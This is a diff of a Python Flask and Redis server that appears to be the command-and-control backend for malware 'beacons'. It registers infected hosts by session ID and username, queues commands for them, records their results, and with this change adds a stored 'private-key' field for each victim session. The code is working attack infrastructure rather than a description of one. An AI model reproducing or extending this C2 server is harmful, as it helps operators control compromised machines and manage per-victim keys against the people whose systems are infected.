@@ -10,8 +10,7 @@
 from datetime import datetime
 from flask import *
 import json
-import redis  # Make sure to install and start the redis server
-# sudo systemctl start redis-server.service
+import redis
 import string
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
@@ -21,7 +20,7 @@ app = Flask(__name__)
 @app.route('/', methods=['GET'])
 def home():
     # This handles initial registration
-    # The beacon sends their current user and we add it to the db
+    # The beacon receives the initial reg and adds it to the db
     if request.method == 'GET':
         uuid = request.headers['APPSESSIONID']
         whoami = request.headers['Res']
@@ -37,6 +36,7 @@ def home():
                 "LastInteraction": "0",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                 "Result": "0",
+                "private-key": "0",
                 "GotIt": "0"
             }
             structure = json.dumps(structure)  # Dump the json
@@ -59,11 +59,12 @@ def session():
             command = command.decode()  # Decode it from bytes
             command = json.loads(command)  # it's returned as string so convert it to dict
             structure = json.dumps(command)  # Dump the dict to json
-            comm = json.loads(structure)  # Load it into a new var
-            Command = comm["Command"]  # Grab the command var from the object
-            LastInteraction = comm["LastInteraction"]
-            result = comm["Result"]
-            whoami = comm["WhoAmI"]
+            connector = json.loads(structure)  # Load it into a new var
+            Command = connector["Command"]  # Grab the command var from the object
+            LastInteraction = connector["LastInteraction"]
+            result = connector["Result"]
+            whoami = connector["WhoAmI"]
+            key = connector["private-key"]
             # Set the command to 0
             structure = {
                 "WhoAmI": f"{whoami}",
@@ -72,6 +73,7 @@ def session():
                 "LastInteraction": f"{LastInteraction}",
                 "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                 "Result": f"{result}",
+                "private-key": f"{key}",
                 "GotIt": "0"
             }
             structure = json.dumps(structure)  # Dump the json
@@ -98,6 +100,7 @@ def schema():
     connector = json.loads(structure)  # Load it into a new var
     LastInteraction = connector["LastInteraction"]
     whoami = connector["WhoAmI"]
+    key = connector["private-key"]
     print(request.headers)
     if set(uuid).difference(string.ascii_letters + string.digits):
         # We're not going to bother with input sanitization here
@@ -112,6 +115,7 @@ def schema():
             "LastInteraction": f"{LastInteraction}",
             "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
             "Result": f"{result}",
+            "private-key": f"{key}",
             "GotIt": "1"
         }
         structure = json.dumps(structure)  # Dump the json
